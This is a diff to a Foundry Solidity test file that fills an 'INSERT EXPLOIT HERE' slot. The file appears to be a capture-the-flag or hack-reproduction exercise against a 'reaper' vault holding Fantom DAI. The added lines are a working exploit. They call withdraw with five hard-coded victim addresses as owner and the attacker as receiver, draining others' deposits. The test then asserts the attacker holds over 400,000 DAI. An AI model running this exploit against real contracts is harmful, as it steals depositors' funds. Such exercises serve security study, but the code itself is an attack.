@@ -17,6 +17,16 @@ contract CounterTest is Test {
         console.log("Your Starting Balance:", fantomDai.balanceOf(address(this)));
         
         // INSERT EXPLOIT HERE
+        // reaper.withdraw(balanceOf(0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E));
+        // reaper.withdraw();
+        // reaper.withdraw();
+
+        // console.log("balance:", reaper.balanceOf(0xfc83DA727034a487f031dA33D55b4664ba312f1D));
+        reaper.withdraw(reaper.maxWithdraw(0xEB7a12fE169C98748EB20CE8286EAcCF4876643b), address(this), 0xEB7a12fE169C98748EB20CE8286EAcCF4876643b);
+        reaper.withdraw(reaper.maxWithdraw(0x056abd53a55C187d738B4A982D36b4dFa506326A), address(this), 0x056abd53a55C187d738B4A982D36b4dFa506326A);
+        reaper.withdraw(reaper.maxWithdraw(0x954773dD09a0bd708D3C03A62FB0947e8078fCf9), address(this), 0x954773dD09a0bd708D3C03A62FB0947e8078fCf9);
+        reaper.withdraw(reaper.maxWithdraw(0xB573f01f2901c0dB3E14Ec80C6E12e4868DEC864), address(this), 0xB573f01f2901c0dB3E14Ec80C6E12e4868DEC864);
+        reaper.withdraw(reaper.maxWithdraw(0xfc83DA727034a487f031dA33D55b4664ba312f1D), address(this), 0xfc83DA727034a487f031dA33D55b4664ba312f1D);
 
         console.log("Your Final Balance:", fantomDai.balanceOf(address(this)));
         assert(fantomDai.balanceOf(address(this)) > 400_000 ether);
